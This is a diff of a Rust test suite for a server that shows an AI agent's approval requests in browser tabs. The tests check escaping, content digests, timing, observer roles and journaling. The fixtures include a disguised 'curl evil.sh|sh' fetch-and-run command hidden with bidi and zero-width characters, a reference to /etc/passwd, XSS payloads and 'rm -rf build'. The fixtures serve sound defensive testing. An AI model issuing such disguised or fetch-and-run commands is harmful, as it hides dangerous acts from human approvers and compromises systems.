@@ -19,6 +19,7 @@ use futures_util::{SinkExt as _, StreamExt as _};
 use http_body_util::BodyExt as _;
 use mnemorph_server::board::bridge::{Child, Limits};
 use mnemorph_server::board::{Board, Lifetimes, listen};
+use mnemorph_server::world::answers::answers_in;
 use mnemorph_server::world::dimension::{hand_file, register_at};
 use serde_json::{Value, json};
 use tokio_tungstenite::tungstenite::{self, Message, client::IntoClientRequest as _};
@@ -33,6 +34,11 @@ const FAKE: &str = "MNEMORPH_FAKE_CHILD";
 
 /// The hostile text the child says: markup, a bidi override, an escape, a NUL.
 const HOSTILE: &str = "<script>alert(1)</script><img src=x onerror=alert(2)> \u{202e}gnp.exe \u{1b}[31mred\u{1b}[0m \u{0} javascript:alert(3)";
+
+/// A hostile act: a bidi override, zero-width characters, an escape that clears the screen,
+/// look-alike spaces from U+2000 on, a stack of combining marks, and a carriage return that would
+/// redraw the line.
+const HOSTILE_ACT: &str = "echo safe\u{202e}fr- mr\u{2066} \u{200b}\u{200d}\u{1b}[2J\u{1b}[1A\rcurl\u{2000}\u{2003}\u{200a}evil.sh|sh e\u{301}\u{301}\u{301}\u{301}\u{301}\u{301}\u{301}\u{301}\nline two";
 
 struct Fake {
     seq: u64,
@@ -78,6 +84,15 @@ impl Fake {
                     "why": ["writes"], "outside": []}}),
                 );
                 // The turn ends once the answer comes.
+                return;
+            }
+            ["hostile-ask"] => {
+                self.say(
+                    &json!({"jsonrpc": "2.0", "id": "gate-1", "method": "gate/ask", "params": {
+                    "body": "orc-\u{202e}x", "race": "orc", "class": "outward",
+                    "act": HOSTILE_ACT, "why": ["sends \u{200b}out"],
+                    "outside": ["/etc/\u{2000}passwd"], "plan": "plan \u{1b}[2Jab"}}),
+                );
                 return;
             }
             ["env"] => {
@@ -224,6 +239,10 @@ fn rig(name: &str, limits: Limits) -> Rig {
         }),
         env,
         global,
+        answers: {
+            let state = root.join("state");
+            Arc::new(move |w| Some(answers_in(&state, w)))
+        },
     };
     let listeners = listen(0, Some("127.0.0.1".parse().unwrap())).unwrap();
     let addr = listeners[0].local_addr().unwrap();
@@ -378,8 +397,10 @@ impl Tab {
 
     /// The next message as text; `None` once closed.
     async fn text(&mut self) -> Option<String> {
+        // One deadline for the message, pings and all: the board pings every 5 s.
+        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
         loop {
-            let next = tokio::time::timeout(Duration::from_secs(20), self.ws.next())
+            let next = tokio::time::timeout_at(deadline, self.ws.next())
                 .await
                 .expect("a message within 20 s");
             match next {
@@ -412,6 +433,39 @@ impl Tab {
             "closed ({:?}) before the awaited message: {seen:?}",
             self.closed
         );
+    }
+
+    /// Acknowledge rendering `ask`'s card, naming `digest`: the answer.
+    async fn ack(&mut self, id: u64, ask: &Value, digest: &Value) -> Value {
+        self.request(
+            id,
+            "board/seen",
+            &json!({"id": ask["id"], "digest": digest}),
+        )
+        .await;
+        self.until(|m| m["id"] == id).await.pop().unwrap()
+    }
+
+    /// Acknowledge `ask`'s card with its own digest: it must be taken.
+    async fn seen(&mut self, id: u64, ask: &Value) {
+        let r = self.ack(id, ask, &ask["params"]["digest"]).await;
+        assert_eq!(r["result"], json!({}), "{r}");
+    }
+
+    /// Answer `ask`, naming `digest`.
+    async fn answer(&mut self, ask: &Value, allow: bool, digest: &Value) {
+        self.send(&json!({"jsonrpc": "2.0", "id": ask["id"], "result": {"allow": allow, "digest": digest}}))
+            .await;
+    }
+
+    /// The next refusal's reason.
+    async fn refused(&mut self) -> String {
+        let r = self
+            .until(|m| method(m) == "board/refused")
+            .await
+            .pop()
+            .unwrap();
+        r["params"]["why"].as_str().unwrap().to_owned()
     }
 
     /// The role it is told next.
@@ -586,27 +640,14 @@ async fn a_waiting_ask_survives_a_reload_and_the_reloaded_tab_answers_it() {
         left <= 570_000 && left > 560_000,
         "time left counts down: {left}"
     );
-    tab.send(&json!({"jsonrpc": "2.0", "id": "gate-1", "result": {"allow": true}}))
-        .await;
+    tab.seen(7, again).await;
+    r.board.pass(Duration::from_millis(300));
+    tab.answer(again, true, &again["params"]["digest"]).await;
     let seen = tab.until(|m| note(m).is_some()).await;
     assert!(seen.iter().any(|m| method(m) == "board/askGone"));
     assert_eq!(
         note(seen.last().unwrap()),
         Some("answer \"gate-1\" allow=true reason=null")
-    );
-    // One answer per ask: a second is refused.
-    tab.send(&json!({"jsonrpc": "2.0", "id": "gate-1", "result": {"allow": false}}))
-        .await;
-    let refused = tab
-        .until(|m| method(m) == "board/refused")
-        .await
-        .pop()
-        .unwrap();
-    assert!(
-        refused["params"]["why"]
-            .as_str()
-            .unwrap()
-            .contains("no such ask")
     );
 }
 
@@ -991,4 +1032,315 @@ async fn a_crash_says_why_and_a_resume_names_only_a_run() {
     assert!(why.starts_with("the chat's process ended"), "{why}");
     assert!(why.contains("the model's reply did not parse"), "{why}");
     assert!(!why.contains('\u{1b}'), "escaped: {why}");
+}
+
+// ---------------------------------------------------------------------------------------------
+// Approvals: the server holds the card's protections, whatever the page did.
+// ---------------------------------------------------------------------------------------------
+
+/// A chat whose controller tab waits on the stand-in's ask: the rig, the browser, the tab and
+/// the ask as it arrived.
+async fn asked(name: &str, prompt: &str) -> (Rig, Browser, String, Tab, Value) {
+    let r = rig(name, Limits::default());
+    let b = r.login().await;
+    let sid = r.start(&b).await;
+    let mut tab = r.tab(&b, &sid).await;
+    assert_eq!(tab.role().await, "controller");
+    tab.request(1, "session/prompt", &json!({"text": prompt}))
+        .await;
+    let ask = tab.until(|m| method(m) == "gate/ask").await.pop().unwrap();
+    (r, b, sid, tab, ask)
+}
+
+/// What the child heard: its answer note, once one comes.
+async fn heard(tab: &mut Tab) -> String {
+    let seen = tab.until(|m| note(m).is_some()).await;
+    note(seen.last().unwrap()).unwrap().to_owned()
+}
+
+/// The answers journaled for the rig's world.
+fn journaled(r: &Rig) -> Vec<Value> {
+    let path = answers_in(&r.root.join("state"), &r.root.join("world"));
+    std::fs::read_to_string(path)
+        .unwrap_or_default()
+        .lines()
+        .map(|l| serde_json::from_str(l).unwrap())
+        .collect()
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn an_ask_reaches_the_tabs_escaped_with_the_digest_of_what_is_shown() {
+    use mnemorph_server::board::bridge::Shown;
+    use mnemorph_server::wire::shown;
+    let (_r, _b, _sid, _tab, ask) = asked("shown", "hostile-ask").await;
+    let p = &ask["params"];
+    let act = p["act"].as_str().unwrap();
+    assert_eq!(act, shown(HOSTILE_ACT));
+    for c in [
+        '\u{202e}', '\u{2066}', '\u{200b}', '\u{200d}', '\u{1b}', '\r', '\u{2000}', '\u{2003}',
+        '\u{200a}',
+    ] {
+        assert!(!act.contains(c), "{c:?} reached the page raw: {act}");
+    }
+    assert!(act.contains("\\u{2000}"), "{act}");
+    // The combining marks are capped: the stack does not reach the page whole.
+    assert!(!act.contains(&"\u{301}".repeat(8)), "{act}");
+    assert_eq!(p["body"], shown("orc-\u{202e}x"));
+    assert_eq!(p["why"][0], shown("sends \u{200b}out"));
+    assert_eq!(p["outside"][0], shown("/etc/\u{2000}passwd"));
+    assert_eq!(p["plan"], shown("plan \u{1b}[2Jab"));
+    for s in [&p["body"], &p["why"][0], &p["outside"][0], &p["plan"]] {
+        let s = s.as_str().unwrap();
+        assert!(
+            !s.contains(['\u{202e}', '\u{200b}', '\u{2000}', '\u{1b}']),
+            "{s}"
+        );
+    }
+    // The digest is of what was shown: the page can compute it over what it renders.
+    let digest = p["digest"].as_str().unwrap();
+    assert_eq!(digest.len(), 64);
+    let raw = json!({"body": "orc-\u{202e}x", "race": "orc", "class": "outward",
+        "act": HOSTILE_ACT, "why": ["sends \u{200b}out"], "outside": ["/etc/\u{2000}passwd"],
+        "plan": "plan \u{1b}[2Jab"});
+    assert_eq!(Shown::of(&raw).digest("gate-1"), digest);
+}
+
+/// The vector the board's page checks its own digest against (`approval.test.ts`).
+#[test]
+fn the_digest_matches_the_shared_vector() {
+    use mnemorph_server::board::bridge::Shown;
+    let s = Shown {
+        body: "rimuru".into(),
+        race: "rimuru".into(),
+        class: "write".into(),
+        act: "rm -rf build\n\\u{202e} é".into(),
+        why: vec!["writes".into(), "deletes".into()],
+        outside: vec![],
+        plan: Some("plan 3f9a".into()),
+    };
+    assert_eq!(
+        s.digest("gate-1"),
+        "2d1d901cda4148560ddd9c4fe7c414a6ffe07a70c873ed9045a5c1c8e095b4d1"
+    );
+    let none = Shown {
+        plan: None,
+        ..s.clone()
+    };
+    assert_ne!(none.digest("gate-1"), s.digest("gate-1"));
+    assert_ne!(s.digest("gate-2"), s.digest("gate-1"));
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn a_wrong_digest_is_refused() {
+    let (r, _b, _sid, mut tab, ask) = asked("digest", "ask").await;
+    let wrong = json!("0".repeat(64));
+    // Not acknowledged under another act's digest.
+    let err = tab.ack(2, &ask, &wrong).await;
+    assert_eq!(err["error"]["code"], -32015, "{err}");
+    tab.seen(3, &ask).await;
+    r.board.pass(Duration::from_millis(300));
+    tab.answer(&ask, true, &wrong).await;
+    assert!(tab.refused().await.contains("digest differs"));
+    tab.answer(&ask, true, &Value::Null).await;
+    assert!(tab.refused().await.contains("digest differs"));
+    // The ask still waits: the right digest is taken.
+    tab.answer(&ask, true, &ask["params"]["digest"]).await;
+    assert_eq!(
+        heard(&mut tab).await,
+        "answer \"gate-1\" allow=true reason=null"
+    );
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn an_allow_before_the_render_ack_or_too_soon_after_it_is_refused() {
+    let (r, _b, _sid, mut tab, ask) = asked("fast", "ask").await;
+    let digest = &ask["params"]["digest"];
+    // Never seen: refused, however long it waited.
+    r.board.pass(Duration::from_secs(5));
+    tab.answer(&ask, true, digest).await;
+    assert!(tab.refused().await.contains("not seen in this tab"));
+    tab.seen(2, &ask).await;
+    tab.answer(&ask, true, digest).await;
+    assert!(tab.refused().await.contains("too fast"));
+    // Real time passes too, a few milliseconds: 250 on the board's clock stays short of 300.
+    r.board.pass(Duration::from_millis(250));
+    tab.answer(&ask, true, digest).await;
+    assert!(tab.refused().await.contains("too fast"));
+    // A second acknowledgement does not move the clock on, or back.
+    tab.seen(3, &ask).await;
+    r.board.pass(Duration::from_millis(50));
+    tab.answer(&ask, true, digest).await;
+    assert_eq!(
+        heard(&mut tab).await,
+        "answer \"gate-1\" allow=true reason=null"
+    );
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn a_denial_needs_no_digest_and_a_second_answer_is_refused() {
+    let (_r, _b, _sid, mut tab, ask) = asked("second", "ask").await;
+    tab.answer(&ask, false, &Value::Null).await;
+    assert_eq!(
+        heard(&mut tab).await,
+        "answer \"gate-1\" allow=false reason=null"
+    );
+    // One answer per ask: neither acknowledged nor answered again.
+    let err = tab.ack(2, &ask, &ask["params"]["digest"]).await;
+    assert_eq!(err["error"]["code"], -32014, "{err}");
+    tab.answer(&ask, true, &ask["params"]["digest"]).await;
+    assert!(tab.refused().await.contains("answered elsewhere"));
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn an_observer_neither_acknowledges_nor_answers_and_a_take_over_re_arms() {
+    let (r, b, sid, mut first, ask) = asked("rearm", "ask").await;
+    let digest = &ask["params"]["digest"];
+    first.seen(2, &ask).await;
+    r.board.pass(Duration::from_secs(1));
+    // Another browser observes: it can neither acknowledge nor answer.
+    let other = r.login().await;
+    let mut stranger = r.tab(&other, &sid).await;
+    assert_eq!(stranger.role().await, "observer");
+    let err = stranger.ack(1, &ask, digest).await;
+    assert_eq!(err["error"]["code"], -32011, "{err}");
+    stranger.answer(&ask, true, digest).await;
+    assert!(stranger.refused().await.contains("observes"));
+    // The owner's second tab takes over: the first tab's acknowledgement no longer counts.
+    let mut second = r.tab(&b, &sid).await;
+    assert_eq!(second.role().await, "observer");
+    second.request(1, "board/takeOver", &json!({})).await;
+    second.until(|m| m["params"]["role"] == "controller").await;
+    first.until(|m| m["params"]["role"] == "observer").await;
+    first.answer(&ask, true, digest).await;
+    assert!(first.refused().await.contains("observes"));
+    second.answer(&ask, true, digest).await;
+    assert!(second.refused().await.contains("not seen in this tab"));
+    second.seen(2, &ask).await;
+    second.answer(&ask, true, digest).await;
+    assert!(second.refused().await.contains("too fast"));
+    // Control back to the first tab: its old acknowledgement is gone too.
+    first.request(3, "board/takeOver", &json!({})).await;
+    first.until(|m| m["params"]["role"] == "controller").await;
+    r.board.pass(Duration::from_secs(1));
+    first.answer(&ask, true, digest).await;
+    assert!(first.refused().await.contains("not seen in this tab"));
+    first.seen(4, &ask).await;
+    r.board.pass(Duration::from_millis(300));
+    first.answer(&ask, true, digest).await;
+    assert_eq!(
+        heard(&mut first).await,
+        "answer \"gate-1\" allow=true reason=null"
+    );
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn every_answer_is_journaled_with_its_connection_digest_and_timing() {
+    let (r, _b, _sid, mut tab, ask) = asked("journal", "ask").await;
+    let digest = ask["params"]["digest"].as_str().unwrap().to_owned();
+    tab.answer(&ask, true, &json!(digest)).await;
+    tab.refused().await;
+    tab.seen(2, &ask).await;
+    r.board.pass(Duration::from_millis(450));
+    tab.answer(&ask, true, &json!(digest)).await;
+    heard(&mut tab).await;
+    let rows = journaled(&r);
+    assert_eq!(rows.len(), 2, "{rows:#?}");
+    let (refused, taken) = (&rows[0], &rows[1]);
+    assert!(
+        refused["outcome"]
+            .as_str()
+            .unwrap()
+            .starts_with("refused: the card was not seen"),
+        "{refused}"
+    );
+    assert_eq!(refused["seen_ms"], Value::Null);
+    assert_eq!(taken["outcome"], "answered");
+    assert_eq!(taken["allow"], true);
+    assert_eq!(taken["ask"], "gate-1");
+    assert_eq!(taken["act"], "rm -rf build");
+    assert_eq!(taken["shown_digest"], digest.as_str());
+    assert_eq!(taken["named_digest"], digest.as_str());
+    assert_eq!(taken["conn"], refused["conn"]);
+    assert!(taken["conn"].as_u64().unwrap() >= 1);
+    assert!(taken["seen_ms"].as_u64().unwrap() >= 450, "{taken}");
+    assert!(taken["asked_ms"].as_u64().unwrap() >= 450, "{taken}");
+    assert!(taken["chat"].is_string() && taken["build"]["version"].is_string());
+    // Chained: every row carries its link.
+    let path = answers_in(&r.root.join("state"), &r.root.join("world"));
+    let report = mnemorph_server::world::answers::journal_at(path)
+        .verify()
+        .unwrap();
+    assert!(report.broken.is_none(), "{report:?}");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn an_allow_that_cannot_be_journaled_is_not_taken() {
+    let (r, _b, _sid, mut tab, ask) = asked("unjournaled", "ask").await;
+    // The journal's directory is a file: no row can be written.
+    let path = answers_in(&r.root.join("state"), &r.root.join("world"));
+    std::fs::create_dir_all(path.parent().unwrap().parent().unwrap()).unwrap();
+    std::fs::write(path.parent().unwrap(), "").unwrap();
+    tab.seen(2, &ask).await;
+    r.board.pass(Duration::from_millis(300));
+    tab.answer(&ask, true, &ask["params"]["digest"]).await;
+    assert!(tab.refused().await.contains("could not be journaled"));
+    // A denial still reaches the core.
+    tab.answer(&ask, false, &Value::Null).await;
+    assert_eq!(
+        heard(&mut tab).await,
+        "answer \"gate-1\" allow=false reason=null"
+    );
+}
+
+/// Two answers to one ask race — the controller's allow, and Esc's denial of what waits: the
+/// first to reach the bridge wins, and the other hears the ask was answered elsewhere. The core
+/// hears one answer at most.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn two_answers_racing_one_wins_and_the_other_hears_answered_elsewhere() {
+    for round in 0..4 {
+        let (r, _b, _sid, mut tab, ask) = asked(&format!("race-{round}"), "ask").await;
+        tab.seen(2, &ask).await;
+        r.board.pass(Duration::from_millis(300));
+        let allow = json!({"jsonrpc": "2.0", "id": ask["id"], "result": {"allow": true, "digest": ask["params"]["digest"]}});
+        let esc = json!({"jsonrpc": "2.0", "id": 3, "method": "session/interrupt", "params": {}});
+        let (a, b) = if round % 2 == 0 {
+            (allow, esc)
+        } else {
+            (esc, allow)
+        };
+        tab.ws.send(Message::text(a.to_string())).await.unwrap();
+        tab.ws.send(Message::text(b.to_string())).await.unwrap();
+        let seen = tab.until(|m| m["id"] == 3).await;
+        let mut seen = seen;
+        // Whatever follows, a short while.
+        while let Ok(Some(m)) = tokio::time::timeout(Duration::from_millis(500), tab.next()).await {
+            seen.push(m);
+        }
+        let gone: Vec<&Value> = seen
+            .iter()
+            .filter(|m| method(m) == "board/askGone")
+            .collect();
+        assert_eq!(gone.len(), 1, "one answer wins: {seen:#?}");
+        let answers = seen
+            .iter()
+            .filter_map(note)
+            .filter(|n| n.starts_with("answer \"gate-1\""))
+            .count();
+        if gone[0]["params"]["why"] == "answered" {
+            assert_eq!(answers, 1, "{seen:#?}");
+        } else {
+            assert_eq!(answers, 0, "{seen:#?}");
+            let refused = seen
+                .iter()
+                .find(|m| method(m) == "board/refused")
+                .expect("the late allow is refused");
+            assert!(
+                refused["params"]["why"]
+                    .as_str()
+                    .unwrap()
+                    .contains("answered elsewhere"),
+                "{refused}"
+            );
+        }
+    }
 }
